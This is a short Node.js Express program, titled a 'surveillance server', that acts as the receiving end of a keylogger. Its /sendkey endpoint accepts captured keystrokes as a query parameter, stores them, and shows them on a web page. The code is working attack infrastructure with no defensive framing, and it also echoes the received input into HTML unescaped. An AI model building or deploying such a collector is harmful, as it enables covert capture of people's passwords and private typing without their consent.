const express = require('express');

var app = express();
var port = process.env.PORT || 80;

var keys = "Keys Logged: ";

var server = app.listen(port, () => {
    console.log('RESTful surveillance server running on port ' + port);
});

app.use(express.static('www'));

app.route('/').get((request, result) => {
    result.send(
    `<html>
        <style>
            .footer {
                position: fixed;
                right: 0;
                bottom: 0;
                left: 0;
                padding: 1rem;
                background-color: #efefef;
                text-align: center;
            }
            body {
                position: relative;
                margin: 0;
                padding-bottom: 6rem;
                font-family: "Helvetica Neue", Arial, sans-serif;
            }
        </style>
        <head>
            <title>Surveillance</title>
        </head>
        <body>
            <h1>Surveillance</h1>
            <p1>`+keys+`</p1>
            <p1 class="footer">Running on Port <strong>`+port+`</strong></p1>
        </body>
    </html>`
    );
})

app.route('/sendkey').get((request, result) => {
    if(!request.query.key) {
        result.send("Keystroke not provided!")
    } else {
        keys = keys+request.query.key;
        result.send("Key Added!")
    }
})